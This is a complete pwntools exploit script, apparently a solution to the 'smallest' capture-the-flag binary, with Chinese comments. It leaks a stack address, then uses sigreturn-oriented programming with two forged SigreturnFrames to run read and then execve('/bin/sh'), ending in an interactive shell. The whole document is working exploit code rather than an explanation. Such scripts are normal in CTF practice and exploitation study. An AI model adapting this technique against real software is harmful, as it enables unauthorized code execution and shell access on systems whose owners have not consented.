from pwn import *
io = process('./smallest')
context.log_level = 'DEBUG'
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']
syscall_ret = 0x4000be
#==== first read ====#
pl = p64(0x4000b0)*3
gdb.attach(io)
io.send(pl)         #let the ret_addr to 0x4000b0
pause()
#==== second read ====#
io.send('\xb3')     #let the ret_addr to 0x4000b3
io.recv(8)          #rax is 0x1,syscall for write
stack_addr = u64(io.recv(8))
io.success('stack_addr ==>'+hex(stack_addr))
read = SigreturnFrame()
read.rax = constants.SYS_read #read函数系统调用号
read.rdi = 0  #read函数一参
read.rsi = stack_addr  #read函数二参
read.rdx = 0x400  #read函数三参
read.rsp = stack_addr  #和rsi寄存器中的值保持一致，确保read函数写的时候rsp指向stack_addr
read.rip = syscall_ret #使得rip指向syscall的位置，在部署好read函数之后能直接调用0
pl2 = p64(0x4000b0) + p64(syscall_ret) + bytes(read)
pause()
#==== third read ====#
io.send(pl2)    #orchestral stack 
#gdb.attach(io)
#pause()
#==== fourth read ====#
io.send(pl2[8:8+15]) #put in place,so that we can syscall(rax:15) for sigreturn

#==== sigreturn read ====#
execve = SigreturnFrame()
execve.rax = constants.SYS_execve
execve.rdi = stack_addr + 0x120
execve.rsi = 0
execve.rdx = 0
execve.rsp = stack_addr
execve.rip = syscall_ret

pl3 = p64(0x4000b0) + p64(syscall_ret) +  bytes(execve)
print(len(pl3))
#pause()
pl3 += (0x120 - len(pl3))*b'\x00' + b'/bin/sh\x00'

io.send(pl3)
#pause()
io.send(pl3[8:8+15])
#gdb.attach(io)
io.interactive()
